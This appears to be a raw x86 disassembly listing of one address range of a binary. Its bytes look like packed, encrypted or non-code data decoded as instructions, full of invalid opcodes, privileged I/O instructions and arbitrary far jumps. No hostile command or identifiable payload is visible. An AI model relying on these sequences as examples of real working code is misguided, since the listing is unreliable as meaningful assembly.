  40cf98:	sti    
  40cf99:	clc    
	...
  40cfa6:	add    BYTE PTR [eax],al
  40cfa8:	add    BYTE PTR [eax+eax*1],ah
  40cfab:	shl    BYTE PTR [edi+ecx*1-0x9],1
  40cfaf:	xchg   ebp,eax
  40cfb0:	inc    esp
  40cfb1:	arpl   si,bx
  40cfb3:	xor    bh,bh
  40cfb5:	sahf   
  40cfb6:	(bad)  
  40cfb7:	add    ch,0x5f
  40cfba:	pop    ebx
  40cfbb:	push   ecx
  40cfbc:	clc    
  40cfbd:	arpl   WORD PTR [edx],si
  40cfbf:	std    
  40cfc0:	xor    BYTE PTR ds:0x7c84fdde,0xb7
  40cfc7:	into   
  40cfc8:	(bad)  
  40cfc9:	in     al,0x9
  40cfcb:	sar    dh,1
  40cfcd:	jbe    0x40cf6e
  40cfcf:	sbb    eax,0xbcf06341
  40cfd4:	shl    DWORD PTR [edi-0x22],0x37
  40cfd8:	mov    esi,DWORD PTR [edi+0x49f7c85b]
  40cfde:	ficomp WORD PTR [eax+0x2f]
  40cfe1:	mov    ah,0xe9
  40cfe3:	sti    
  40cfe4:	out    0x2,eax
  40cfe6:	out    dx,al
  40cfe7:	into   
  40cfe8:	(bad)  
  40cfe9:	ficomp DWORD PTR [ecx]
  40cfeb:	sar    BYTE PTR [edi+0x5e],1
  40cfee:	fadd   DWORD PTR [eax+0x41]
  40cff1:	arpl   si,bx
  40cff3:	push   edi
  40cff4:	sub    ebx,edi
  40cff6:	stos   BYTE PTR es:[edi],al
  40cff7:	inc    eax
  40cff8:	inc    ecx
  40cff9:	arpl   WORD PTR [esi-0x21ddbf42],si
  40cfff:	(bad)  
  40d001:	cmc    
  40d002:	cs iret 
  40d004:	test   BYTE PTR [ebx+0x54682bb2],ah
  40d00a:	pushf  
  40d00b:	inc    ebx
	...
  40d01c:	retf   
  40d01d:	cmp    BYTE PTR [ebp+0x41],al
  40d020:	arpl   WORD PTR [esi-0x4e],ax
  40d023:	jge    0x40d071
  40d025:	pop    ss
  40d026:	mov    BYTE PTR [edx*2+0x6344ab05],0x6
  40d02e:	push   0x11
  40d030:	push   eax
  40d031:	inc    ebx
  40d032:	test   al,0x3
  40d034:	arpl   WORD PTR [ecx-0x2d],dx
  40d037:	(bad)  
  40d038:	lahf   
  40d039:	int    0xe8
  40d03b:	add    esp,DWORD PTR [ebx+0x5]
  40d03e:	rol    bl,cl
  40d040:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d041:	xor    eax,0xcdb78099
  40d046:	call   0x6345:0x2af46fce
  40d04d:	sub    BYTE PTR [eax-0x9239eb4],0x82
  40d054:	outs   dx,DWORD PTR ds:[esi]
  40d055:	int    0xe8
  40d057:	pop    eax
  40d058:	popa   
  40d059:	(bad)  
  40d05b:	into   
  40d05c:	push   edi
  40d05d:	int    0xbd
  40d05f:	pop    eax
  40d060:	imul   ebx,ebp,0x3a
  40d063:	retf   
  40d064:	int    0xc7
  40d066:	popa   
  40d067:	cmp    bl,cl
  40d069:	jnp    0x40d065
  40d06b:	into   
  40d06c:	aaa    
  40d06d:	int    0x9d
  40d06f:	xor    DWORD PTR [ebx-0x38],ebp
  40d072:	sbb    edi,esp
  40d074:	les    edi,FWORD PTR [edx]
  40d076:	mov    esi,cs
  40d078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d079:	(bad)  
  40d07a:	sti    
  40d07b:	sti    
  40d07c:	test   BYTE PTR [ebx],bl
  40d07e:	jg     0x40d04e
	...
  40d08c:	add    BYTE PTR [eax],al
  40d08e:	add    BYTE PTR [ebp-0x72300439],dl
  40d094:	push   ecx
  40d095:	loope  0x40d072
  40d097:	xor    BYTE PTR [esi+0x66],dl
  40d09a:	into   
  40d09b:	stos   DWORD PTR es:[edi],eax
  40d09c:	ret    0x3e4
  40d09f:	push   cs
  40d0a0:	jl     0x40d0e6
  40d0a2:	and    BYTE PTR [eax+0x1036b6d4],0x7c
  40d0a9:	fwait
  40d0aa:	jmp    DWORD PTR ds:0x6303e904
  40d0b0:	add    eax,0xfdab3600
  40d0b5:	out    0x6d,eax
  40d0b7:	pushf  
  40d0b8:	add    eax,0x6286a00
  40d0bd:	ja     0x40d0af
  40d0bf:	pop    ecx
  40d0c0:	lds    ebx,FWORD PTR [edx-0x4a]
  40d0c3:	jle    0x40d081
  40d0c5:	shl    ecx,0x60
  40d0c8:	mov    ah,0xe7
  40d0ca:	jb     0x40d127
  40d0cc:	stc    
  40d0cd:	mov    bl,ch
  40d0cf:	cdq    
  40d0d0:	scas   al,BYTE PTR es:[edi]
  40d0d1:	push   cs
  40d0d2:	imul   edi,DWORD PTR [edx-0x7616013a],0x51
  40d0d9:	or     BYTE PTR [edx-0x54],dh
  40d0dc:	std    
  40d0dd:	jmp    0x1369:0x57a7d43
  40d0e4:	pop    ss
  40d0e5:	jb     0x40d0ca
  40d0e7:	loopne 0x40d0b3
  40d0e9:	cmp    BYTE PTR [esi],bh
  40d0eb:	fs test ebx,ebp
  40d0ee:	stc    
  40d0ef:	mov    ebx,0xb57feb
	...
  40d100:	add    BYTE PTR [eax],al
  40d102:	and    BYTE PTR [ebx+0xd],dl
  40d105:	imul   esi,DWORD PTR [ebx-0x1f0e88c0],0xab6940da
  40d10f:	cld    
  40d110:	jmp    0x752e:0x5ac54be0
  40d117:	mov    esp,0x960f1c1
  40d11c:	xor    bl,bh
  40d11e:	cwde   
  40d11f:	or     bh,BYTE PTR [ecx]
  40d121:	(bad)  
  40d122:	sbb    DWORD PTR fs:[eax],esi
  40d125:	or     BYTE PTR [esi+0x7adb410a],0xa
  40d12c:	inc    esi
  40d12d:	(bad)  
  40d12e:	pop    esi
  40d12f:	sbb    DWORD PTR [ecx-0x13],eax
  40d132:	push   0xffffffdb
  40d134:	or     BYTE PTR [edx],al
  40d136:	lahf   
  40d137:	sub    ebx,DWORD PTR [edi+0x0]
  40d13a:	add    al,0x8b
  40d13c:	ror    BYTE PTR [eax],0x4a
  40d13f:	ret    0x4de
  40d142:	inc    eax
  40d143:	mov    esi,0xbfb94ba8
  40d148:	add    BYTE PTR [ebx],cl
  40d14a:	mov    eax,ds:0xff8ba22e
  40d14f:	(bad)  
  40d152:	lds    edi,FWORD PTR [esi]
  40d154:	clc    
  40d155:	dec    edi
  40d157:	leave  
  40d158:	lea    eax,[ebp+0x66]
  40d15b:	rol    BYTE PTR [ebx-0xc],0xa
  40d15f:	add    al,BYTE PTR [eax]
  40d161:	add    BYTE PTR [ecx-0xa],bh
  40d164:	sub    DWORD PTR ss:[eax],eax
	...
  40d173:	add    BYTE PTR [eax],al
  40d175:	mov    ebx,0x3c740001
  40d17a:	inc    esi
  40d17b:	inc    esp
  40d17c:	lock cmp ch,BYTE PTR [ebx]
  40d17f:	add    DWORD PTR [edx-0x6],ebp
  40d182:	sub    eax,DWORD PTR [eax]
  40d184:	push   0xfffffffa
  40d186:	sub    eax,DWORD PTR [eax]
  40d188:	lea    ecx,[edi-0x5000b147]
  40d18e:	lock sub BYTE PTR [ecx-0x46],al
  40d192:	int3   
  40d193:	mov    esi,0x7b84d074
  40d198:	hlt    
  40d199:	retf   0x342d
  40d19c:	mov    edi,DWORD PTR [edi+0x5]
  40d19f:	mov    ecx,DWORD PTR [ebp-0x36]
  40d1a2:	cld    
  40d1a3:	pop    es
  40d1a4:	ja     0x40d146
  40d1a6:	mov    ch,0x89
  40d1a8:	jne    0x40d1c8
  40d1aa:	dec    ebp
  40d1ab:	jl     0x40d1b5
  40d1ad:	adc    DWORD PTR [edi],eax
  40d1af:	lock jecxz 0x40d22a
  40d1b2:	mov    ah,0xa2
  40d1b4:	mov    edi,DWORD PTR [edi]
  40d1b6:	add    eax,0x491a75ff
  40d1bb:	(bad)  
  40d1bc:	dec    BYTE PTR [edi+0x63e3e6ad]
  40d1c2:	fwait
  40d1c3:	add    al,BYTE PTR [eax]
  40d1c5:	stos   DWORD PTR es:[edi],eax
  40d1c6:	fadd   QWORD PTR [edx]
  40d1c8:	add    BYTE PTR [ebx+0x67],ah
  40d1cb:	sub    ebx,DWORD PTR [esi+0x2a]
  40d1ce:	icebp  
  40d1cf:	cli    
  40d1d0:	(bad)  
  40d1d1:	jns    0x40d1c1
  40d1d3:	daa    
  40d1d4:	pop    edi
  40d1d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1d6:	in     eax,0xc0
  40d1d8:	pop    es
	...
  40d1e5:	add    BYTE PTR [eax],al
  40d1e7:	add    BYTE PTR [ebx-0x7f],ah
  40d1ea:	ja     0x40d1d7
  40d1ec:	loopne 0x40d1d8
  40d1ee:	ret    0x6367
  40d1f1:	into   
  40d1f2:	add    al,BYTE PTR [eax]
  40d1f4:	cmp    edx,DWORD PTR [ecx+edx*2-0x1]
  40d1f8:	sbb    al,0x36
  40d1fa:	inc    esi
  40d1fb:	cld    
  40d1fc:	mov    ebp,DWORD PTR [esi+0x6630022]
  40d202:	xchg   ecx,eax
  40d203:	jno    0x40d209
  40d205:	mov    ah,0x78
  40d207:	inc    esp
  40d208:	sti    
  40d209:	push   esi
  40d20a:	add    al,0x20
  40d20c:	arpl   WORD PTR [esi-0x248e5b26],bp
  40d212:	retf   0x9e88
  40d215:	ficomp DWORD PTR [ebx+0x0]
  40d218:	sub    DWORD PTR [esi+0xfbe802],0xffffffcb
  40d21f:	(bad)  
  40d220:	(bad)  
  40d222:	shl    DWORD PTR [edi+0x63],cl
  40d225:	push   cs
  40d226:	add    al,0x0
  40d228:	retf   
  40d229:	aaa    
  40d22a:	push   esi
  40d22b:	push   DWORD PTR [ebp+esi*1-0x51c413bf]
  40d232:	and    al,BYTE PTR [eax]
  40d234:	arpl   WORD PTR [esi-0x74638db7],ax
  40d23a:	jl     0x40d280
  40d23c:	mov    edx,DWORD PTR [esi]
  40d23e:	add    al,0x20
  40d240:	arpl   WORD PTR [esi+0x331170da],bp
  40d246:	retf   
  40d247:	mov    BYTE PTR [esi],ah
  40d249:	add    eax,0xcb4d
	...
  40d25a:	add    bh,ch
  40d25c:	adc    al,0xd1
  40d25e:	icebp  
  40d25f:	and    DWORD PTR [esi-0x17],eax
  40d262:	retf   0xc0ef
  40d265:	inc    eax
  40d266:	jnp    0x40d208
  40d268:	add    eax,0x112086e9
  40d26d:	ds push ecx
  40d26f:	jae    0x40d29e
  40d271:	add    BYTE PTR [edi-0x5e],al
  40d274:	add    eax,0xad3b512e
  40d279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d27a:	aas    
  40d27b:	arpl   WORD PTR ds:0xc458c06a,ax
  40d281:	fwait
  40d282:	repz mov esp,0x6344aa03
  40d288:	les    edi,FWORD PTR [ebx-0x31]
  40d28b:	cld    
  40d28c:	sub    eax,0x886303a5
  40d291:	sub    al,0xf8
  40d293:	add    eax,0x9e5bd93a
  40d298:	dec    eax
  40d299:	sub    BYTE PTR [esp+esi*8],al
  40d29c:	cmp    ecx,ebx
  40d29e:	fist   DWORD PTR [esi-0x1ffc16b7]
  40d2a4:	enter  0xcadc,0x57
  40d2a8:	adc    eax,0x46205451
  40d2ad:	jmp    0xc0f22a7c
  40d2b2:	inc    esi
  40d2b3:	pop    ds
  40d2b4:	add    eax,0x10a086e9
  40d2b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2ba:	push   eax
  40d2bb:	addr16 sub eax,0x4667
	...
  40d2cd:	add    BYTE PTR [edx],ah
  40d2cf:	add    eax,0xacbb5096
  40d2d4:	fdivr  DWORD PTR [edi]
  40d2d6:	arpl   WORD PTR ds:0xc468bf6a,ax
  40d2dc:	repz repz add al,0x97
  40d2e0:	jmp    FWORD PTR [ecx]
  40d2e2:	push   ds
  40d2e3:	add    eax,0xab9cf4ff
  40d2e8:	sbb    al,0xad
  40d2ea:	pusha  
  40d2eb:	add    eax,0x2d742583
  40d2f0:	add    BYTE PTR [esi+0x13],dl
  40d2f3:	sar    esi,0xd4
  40d2f6:	push   esp
  40d2f7:	les    esi,FWORD PTR [esp+ebx*4]
  40d2fa:	ja     0x40d340
  40d2fc:	add    BYTE PTR [ecx+0x11],dl
  40d2ff:	aaa    
  40d300:	push   DWORD PTR [esi]
  40d302:	(bad)  
  40d303:	dec    ecx
  40d304:	loopne 0x40d2c9
  40d306:	pusha  
  40d307:	ret    0x2174
  40d30a:	sub    DWORD PTR [edx],edi
  40d30c:	or     al,0x1e
  40d30e:	push   ebx
  40d30f:	pop    eax
  40d310:	sub    DWORD PTR [eax-0x6a3f52a0],ebp
  40d316:	sub    esp,eax
  40d318:	mov    BYTE PTR [esp+edi*4-0x6301ffd4],ch
  40d31f:	mov    ecx,0xc40c7cfe
  40d324:	xor    al,0x94
  40d326:	pop    edi
  40d327:	inc    esp
  40d328:	add    cl,dl
  40d32a:	(bad)  
  40d32b:	ss (bad) 
  40d32d:	fisubr WORD PTR [eax+0x49]
  40d330:	fadd   DWORD PTR [ebx+0x0]
	...
  40d33f:	add    BYTE PTR [eax],al
  40d341:	pop    edi
  40d342:	ret    0xd974
  40d345:	stos   BYTE PTR es:[edi],al
  40d346:	cmp    eax,ebp
  40d348:	(bad)  
  40d349:	fs pop eax
  40d34b:	sub    DWORD PTR [eax],ebp
  40d34d:	lods   eax,DWORD PTR ds:[si]
  40d34f:	xchg   esp,eax
  40d350:	cmp    eax,0x2488c39a
  40d355:	repz sub al,0x0
  40d358:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d359:	and    al,0xb1
  40d35b:	(bad)  
  40d35c:	adc    al,0x8f
  40d35e:	ret    
  40d35f:	xor    al,0x3c
  40d361:	dec    eax
  40d362:	inc    esp
  40d363:	add    BYTE PTR [ecx+0xff392a],al
  40d369:	fnstsw WORD PTR [esi]
  40d36b:	inc    esp
  40d36c:	sar    bh,1
  40d36e:	add    eax,eax
  40d370:	push   eax
  40d371:	or     eax,0x77ffe452
  40d376:	mov    edx,0x1fb735fd
  40d37b:	inc    ecx
  40d37c:	add    BYTE PTR [edx],dl
  40d37e:	and    al,0x74
  40d380:	dec    DWORD PTR ds:0xc9cc443e
  40d386:	dec    edx
  40d387:	loopne 0x40d389
  40d389:	dec    ebp
  40d38a:	inc    edx
  40d38b:	mov    dh,0x0
  40d38d:	cmp    al,BYTE PTR [esi]
  40d38f:	cmp    DWORD PTR [ebp+0x66],0x9
  40d393:	je     0x40dd58
  40d399:	leave  
  40d39a:	dec    edx
  40d39b:	rol    BYTE PTR [eax],1
  40d39d:	cmp    eax,0x3a00a242
  40d3a2:	push   es
  40d3a3:	lea    eax,[ebp+0x0]
	...
  40d3b2:	add    BYTE PTR [eax],al
  40d3b4:	inc    esi
  40d3b5:	stc    
  40d3b6:	(bad)  
  40d3b7:	jne    0x40d42f
  40d3b9:	loope  0x40d409
  40d3bb:	std    
  40d3bc:	or     eax,0xfdc009cd
  40d3c1:	inc    ecx
  40d3c2:	mov    es,WORD PTR [eax]
  40d3c4:	or     al,BYTE PTR [esi]
  40d3c6:	cmp    DWORD PTR [ebp-0x3a],0x5
  40d3ca:	je     0x40da57
  40d3d0:	jg     0x40d3d5
  40d3d2:	enter  0xad50,0x52
  40d3d6:	shr    al,1
  40d3d8:	fmul   st,st(2)
  40d3da:	std    
  40d3db:	call   ecx
  40d3dd:	lds    esi,FWORD PTR [edx+0x75]
  40d3e0:	cmp    DWORD PTR [ebx-0x38],ecx
  40d3e3:	add    BYTE PTR [esi+0x5c],dh
  40d3e6:	push   0xbcdcca10
  40d3eb:	call   DWORD PTR [edi-0x3f]
  40d3ee:	out    0x76,al
  40d3f0:	arpl   WORD PTR [ecx],cx
  40d3f2:	leave  
  40d3f3:	(bad)  
  40d3f4:	pushf  
  40d3f5:	sbb    ah,ah
  40d3f7:	dec    BYTE PTR [esi]
  40d3f9:	mov    ah,0xda
  40d3fb:	int3   
  40d3fc:	inc    BYTE PTR [edx-0x38]
  40d3ff:	dec    BYTE PTR [esi]
  40d401:	cwde   
  40d402:	(bad)  
  40d403:	je     0x40d470
  40d405:	test   ah,al
  40d407:	ins    BYTE PTR es:[edi],dx
  40d408:	je     0x40d434
  40d40a:	enter  0x8b74,0x62
  40d40e:	dec    esi
  40d40f:	or     BYTE PTR [ebx-0x5e],bh
  40d412:	push   ebp
  40d413:	call   FWORD PTR [eax+edx*2+0x4e]
  40d417:	les    eax,FWORD PTR [eax]
	...
  40d425:	add    BYTE PTR [eax],al
  40d427:	push   esp
  40d428:	sub    BYTE PTR [esi-0x25492902],0x7c
  40d42f:	mov    dh,0xf7
  40d431:	(bad)  
  40d432:	(bad)  
  40d433:	mov    dh,0xe6
  40d435:	(bad)  
  40d436:	je     0x40d44b
  40d438:	call   0x907bdc8a
  40d43d:	push   ebp
  40d43e:	jmp    DWORD PTR [esp+ebp*1]
  40d441:	inc    esi
  40d442:	int3   
  40d443:	arpl   WORD PTR [edx-0x11697d13],bx
  40d449:	(bad)  
  40d44a:	je     0x40d4a8
  40d44c:	xor    edi,DWORD PTR [esi]
  40d44e:	int3   
  40d44f:	add    al,0x7f
  40d451:	(bad)  
  40d452:	je     0x40d4bf
  40d454:	push   es
  40d455:	and    ebp,DWORD PTR [ebp-0xc]
  40d458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d459:	fimul  DWORD PTR [ecx]
  40d45b:	jns    0x40d40b
  40d45d:	lds    esi,FWORD PTR [ebx+ebx*2-0x3a]
  40d461:	out    dx,eax
  40d462:	ins    BYTE PTR es:[edi],dx
  40d463:	fmul   st(7),st
  40d465:	(bad)  
  40d466:	je     0x40d43f
  40d468:	(bad)  
  40d469:	sub    BYTE PTR [edi-0x34],0x7f
  40d46d:	(bad)  
  40d46e:	je     0x40d43b
  40d470:	(bad)  
  40d471:	dec    edx
  40d472:	jo     0x40d430
  40d474:	outs   dx,DWORD PTR ds:[esi]
  40d475:	(bad)  
  40d476:	je     0x40d427
  40d478:	add    eax,0xc0335391
  40d47d:	popf   
  40d47e:	(bad)  
  40d47f:	das    
  40d480:	mov    ch,0x80
  40d482:	pop    ebx
  40d483:	adc    eax,eax
  40d485:	(bad)  
  40d486:	(bad)  
  40d487:	cmpxchg DWORD PTR [eax+0x63],edx
	...
  40d49a:	adc    eax,eax
  40d49c:	jge    0x40d465
  40d49e:	shrd   DWORD PTR [eax+0x6dbff32b],eax,cl
  40d4a5:	(bad)  
  40d4a6:	out    dx,eax
  40d4a7:	test   al,0x50
  40d4a9:	xor    esi,ebx
  40d4ab:	mov    edi,0xa4efc75d
  40d4b0:	inc    eax
  40d4b1:	cmp    edx,ebx
  40d4b3:	ror    BYTE PTR [ebp-0x39],0xcf
  40d4b7:	loope  0x40d509
  40d4b9:	inc    ebx
  40d4ba:	rol    eax,cl
  40d4bc:	cmp    eax,0x40ddcfc7
  40d4c1:	or     esi,DWORD PTR [ebx-0x5038d240]
  40d4c7:	fst    DWORD PTR [eax]
  40d4c9:	adc    esi,DWORD PTR [ebx-0x5038e240]
  40d4cf:	aad    0x0
  40d4d1:	sbb    edx,DWORD PTR [ebx-0x7038f240]
  40d4d7:	rcl    DWORD PTR [eax],1
  40d4d9:	and    edx,DWORD PTR [ebx+0x22bcfdc0]
  40d4df:	adc    ecx,ebp
  40d4e1:	xor    al,ch
  40d4e3:	mov    al,0x67
  40d4e5:	sar    ah,0xb7
  40d4e8:	in     eax,0xc6
  40d4ea:	fisttp WORD PTR [ecx-0x23]
  40d4ed:	xor    esp,esp
  40d4ef:	cmp    ebp,esp
  40d4f1:	(bad)  
  40d4f2:	xchg   edi,eax
  40d4f3:	pop    edx
  40d4f4:	add    BYTE PTR [ebp+0x63],al
  40d4f7:	lods   eax,DWORD PTR ds:[esi]
  40d4f8:	dec    esp
  40d4f9:	inc    edx
  40d4fa:	arpl   WORD PTR ds:0xc3f2,ax
	...
  40d50c:	add    BYTE PTR [ebp-0x76],dl
  40d50f:	(bad)  
  40d510:	fsub   QWORD PTR [edi+0x5]
  40d513:	add    BYTE PTR [esi-0x170042dd],ah
  40d519:	pusha  
  40d51a:	add    eax,0xbe9324c7
  40d51f:	push   es
  40d520:	jmp    0x3410085
  40d525:	pop    edi
  40d526:	sub    eax,DWORD PTR [eax]
  40d528:	adc    esp,DWORD PTR [edi-0x6e]
  40d52b:	inc    esp
  40d52c:	jne    0x40d57e
  40d52e:	xchg   edx,eax
  40d52f:	test   BYTE PTR [ecx-0x53],bh
  40d532:	mov    esi,0x389c19fe
  40d537:	clc    
  40d538:	adc    ax,cx
  40d53b:	out    0x17,eax
  40d53d:	and    DWORD PTR ds:0x3320e200,eax
  40d543:	add    eax,0xfebf0540
  40d548:	jmp    0xa8689cf5
  40d54d:	pusha  
  40d54e:	mov    esi,0x5e18e574
  40d553:	jae    0x40d583
  40d555:	sbb    eax,0xab398b4f
  40d55a:	mov    edi,ebp
  40d55c:	push   ss
  40d55d:	sbb    eax,0x38bb4fc0
  40d562:	dec    esi
  40d563:	jae    0x40d573
  40d565:	sbb    eax,0x1d11848e
  40d56a:	sar    dh,0x11
  40d56d:	jge    0x40d59e
  40d56f:	push   esi
	...
  40d57d:	add    BYTE PTR [eax],al
  40d57f:	add    BYTE PTR [ecx+ecx*2-0x10],dh
  40d583:	cdq    
  40d584:	cwde   
  40d585:	or     eax,DWORD PTR [ebx+0x28]
  40d588:	addr16 mov esi,0xc016d1b4
  40d58e:	(bad)  
  40d58f:	(bad)  
  40d590:	ins    BYTE PTR es:[edi],dx
  40d591:	pop    eax
  40d592:	sub    DWORD PTR [eax],ebp
  40d594:	pop    edi
  40d595:	lods   eax,DWORD PTR ds:[esi]
  40d596:	pushf  
  40d597:	add    BYTE PTR [eax+0x3f89fdc8],cl
  40d59d:	(bad)  
  40d59f:	push   ebp
  40d5a1:	test   BYTE PTR [ebx-0x2371214],bh
  40d5a7:	add    BYTE PTR [esi-0x15],cl
  40d5aa:	cmp    BYTE PTR [ebp-0x36],0x5
  40d5ae:	jne    0x40d5f9
  40d5b0:	add    DWORD PTR [esi],edi
  40d5b2:	jmp    0x40d5ab
  40d5b4:	in     eax,0xc8
  40d5b6:	std    
  40d5b7:	xor    BYTE PTR ds:0x5f7eb3e,dl
  40d5bd:	enter  0xbd7f,0xe6
  40d5c1:	sar    ch,1
  40d5c3:	jmp    edx
  40d5c5:	add    al,0x0
  40d5c7:	add    BYTE PTR [esp+edi*4-0x2fe97a3b],cl
  40d5ce:	std    
  40d5cf:	jmp    DWORD PTR [edx-0x5efffffc]
  40d5d5:	stos   DWORD PTR es:[edi],eax
  40d5d6:	std    
  40d5d7:	lea    esi,[esi-0x7a000230]
  40d5dd:	mov    gs,edx
  40d5df:	div    DWORD PTR [ebp-0x38]
  40d5e2:	std    
  40d5e3:	mov    ch,0x0
	...
  40d5f1:	add    BYTE PTR [eax],al
  40d5f3:	mov    ds:0x85fffdd0,al
  40d5f8:	dec    esi
  40d5f9:	or     al,ch
  40d5fb:	add    al,dh
  40d5fd:	std    
  40d5fe:	dec    DWORD PTR [ecx+0x65f7ea86]
  40d604:	enter  0x74fe,0x47
  40d608:	enter  0xecb3,0xd
  40d60c:	leave  
  40d60d:	std    
  40d60e:	call   0x402f29
  40d613:	add    eax,0x5f7ea8f
  40d618:	leave  
  40d619:	out    0x11,al
  40d61b:	xchg   ebp,eax
  40d61c:	enter  0xfffd,0x63
  40d620:	mov    eax,ds:0xced4f6da
  40d625:	ret    
  40d626:	je     0x40d683
  40d628:	aam    0xde
  40d62a:	std    
  40d62b:	les    edi,FWORD PTR [esi-0x3d]
  40d62e:	mov    ah,0xcb
  40d630:	jle    0x40d5f5
  40d632:	dec    bl
  40d634:	jae    0x40d68a
  40d636:	jmp    FWORD PTR [esi+eiz*2+0x62baf83d]
  40d63d:	(bad)  
  40d63e:	(bad)  
  40d63f:	pushf  
  40d640:	xchg   esi,eax
  40d641:	dec    ebp
  40d642:	cld    
  40d643:	mov    ebp,ecx
  40d645:	inc    edx
  40d646:	add    BYTE PTR [ebx+0x75],ah
  40d649:	rol    BYTE PTR [edi],0x63
  40d64c:	sbb    DWORD PTR [ecx-0x15],edi
  40d64f:	loopne 0x40d6c0
  40d651:	(bad)  
  40d652:	imul   esp,DWORD PTR [ebx+0x2],0xff14
	...
  40d665:	add    dh,dh
  40d667:	mov    bl,0xda
  40d669:	or     edi,esi
  40d66b:	pop    esi
  40d66c:	les    ecx,FWORD PTR [eax-0xba4ad5a]
  40d672:	mov    eax,ds:0xd6ff026d
  40d677:	mov    dh,0xda
  40d679:	mov    ds:0xfec3fc45,al
  40d67e:	mov    dh,0xf2
  40d680:	ret    
  40d681:	je     0x40d6ee
  40d683:	inc    esi
  40d684:	push   cs
  40d685:	ins    BYTE PTR es:[edi],dx
  40d686:	sub    al,0xe4
  40d688:	mov    ecx,0x2dae5fc1
  40d68d:	mov    ecx,DWORD PTR [edi]
  40d68f:	xor    BYTE PTR [edi+0x5873adfb],bh
  40d695:	add    BYTE PTR [ecx+0x7d],bh
  40d698:	ret    
  40d699:	je     0x40d6f6
  40d69b:	push   ss
  40d69c:	lods   al,BYTE PTR ds:[esi]
  40d69d:	push   0xfffffffc
  40d69f:	mov    bl,0x78
  40d6a1:	inc    esp
  40d6a2:	mul    DWORD PTR [edi]
  40d6a4:	push   cs
  40d6a5:	outs   dx,BYTE PTR ds:[esi]
  40d6a6:	cmp    eax,DWORD PTR ds:0xfad80428
  40d6ac:	pop    edx
  40d6ad:	in     al,dx
  40d6ae:	and    eax,DWORD PTR ds:0x31630369
  40d6b4:	and    al,0x2c
  40d6b6:	push   es
  40d6b7:	dec    ecx
  40d6b8:	sub    BYTE PTR [esp+ebp*1],al
  40d6bb:	lods   eax,DWORD PTR ds:[esi]
  40d6bc:	fadd   QWORD PTR [ebx+eiz*2+0x5]
  40d6c0:	loop   0x40d685
  40d6c2:	xor    BYTE PTR [edi+edx*1],bl
  40d6c5:	lods   al,BYTE PTR ds:[esi]
  40d6c6:	ins    DWORD PTR es:[edi],dx
  40d6c7:	cmp    eax,0xc3a6
	...
  40d6d8:	add    BYTE PTR [ebp*1+0x7b8c03e9],dl
  40d6df:	add    BYTE PTR [ebx+0x21],dh
  40d6e2:	inc    esi
  40d6e3:	jmp    0xf173633b
  40d6e8:	stos   DWORD PTR es:[edi],eax
  40d6e9:	push   ebx
  40d6ea:	cwde   
  40d6eb:	jge    0x40d6b0
  40d6ed:	test   BYTE PTR [edx+0x7],bl
  40d6f0:	ret    
  40d6f1:	jne    0x40d6a3
  40d6f3:	out    0x49,eax
  40d6f5:	jecxz  0x40d6f2
  40d6f7:	call   0x5d844034
  40d6fc:	neg    DWORD PTR [esi+edi*2]
  40d6ff:	push   ebp
  40d700:	ret    
  40d701:	push   ebp
  40d702:	mov    esp,0x494725a
  40d707:	mov    esp,0x3d32457e
  40d70c:	ret    
  40d70d:	mov    bh,0xd
  40d70f:	inc    ecx
  40d710:	jge    0x40d6db
  40d712:	mov    esp,0xce8d632d
  40d717:	sub    cl,BYTE PTR [eax]
  40d719:	arpl   WORD PTR [edx+0x72],dx
  40d71c:	mov    al,0xe1
  40d71e:	rcl    BYTE PTR [eax],0x57
  40d721:	sbb    al,0x42
  40d723:	adc    DWORD PTR [ebx+eiz*2],eax
  40d726:	add    eax,0xb99fcae9
  40d72b:	call   0x463a33
  40d730:	bound  ebp,QWORD PTR [edx+0x60b18309]
  40d736:	xor    cl,BYTE PTR [ecx]
  40d738:	adc    bl,BYTE PTR [edi]
  40d73a:	out    dx,eax
  40d73b:	rol    DWORD PTR [edx+0x0],1
	...
  40d74a:	add    BYTE PTR [eax],al
  40d74c:	scas   al,BYTE PTR es:[edi]
  40d74d:	lds    ecx,FWORD PTR [ebx]
  40d74f:	jmp    0xe940dca9
  40d754:	pusha  
  40d755:	mov    al,0x60
  40d757:	push   0x23
  40d759:	adc    eax,0x906a3500
  40d75e:	inc    esp
  40d75f:	(bad)  
  40d761:	adc    edi,edi
  40d763:	xor    al,0x53
  40d765:	mov    esp,0xcaf8f174
  40d76a:	addr16 sahf 
  40d76c:	mov    eax,ds:0x5be0fa86
  40d771:	add    cl,BYTE PTR [ecx]
  40d773:	and    al,0xcf
  40d775:	scas   al,BYTE PTR es:[edi]
  40d776:	inc    ebp
  40d777:	sbb    DWORD PTR [edx+0x3a],edi
  40d77a:	(bad)  
  40d77b:	jle    0x40d71e
  40d77d:	or     al,0x45
  40d77f:	jno    0x40d799
  40d781:	outs   dx,BYTE PTR ds:[esi]
  40d782:	jg     0x40d76d
  40d784:	pusha  
  40d785:	add    eax,0xf6b5eb75
  40d78a:	and    BYTE PTR [edx+0x68],0x30
  40d78e:	adc    eax,0x8abdab62
  40d793:	mov    ah,0xc
  40d795:	or     al,0xa4
  40d797:	sub    ebx,DWORD PTR [eax-0x3c]
  40d79a:	fcomip st,st(1)
  40d79c:	out    dx,eax
  40d79d:	inc    ecx
  40d79e:	clc    
  40d79f:	pusha  
  40d7a0:	fwait
  40d7a1:	mov    ecx,0x41dddaea
  40d7a6:	clc    
  40d7a7:	jb     0x40d734
  40d7a9:	mov    ecx,0x426450e
  40d7ae:	ror    DWORD PTR [ecx],0x0
	...
  40d7bd:	add    BYTE PTR [eax],al
  40d7bf:	imul   ecx,DWORD PTR [esp+eax*2-0x3ae20ef],0xf983b900
  40d7ca:	or     DWORD PTR [eax+ebx*4-0x77],esi
  40d7ce:	inc    ebp
  40d7cf:	inc    BYTE PTR [ebx+0xc770036]
  40d7d5:	sub    eax,eax
  40d7d7:	push   ecx
  40d7d8:	shr    ecx,cl
  40d7da:	push   es
  40d7db:	push   ecx
  40d7dc:	inc    edx
  40d7dd:	clc    
  40d7de:	mov    edx,DWORD PTR [edi-0x736a63b]
  40d7e4:	adc    eax,0x75515500
  40d7e9:	add    esp,0x66a326f6
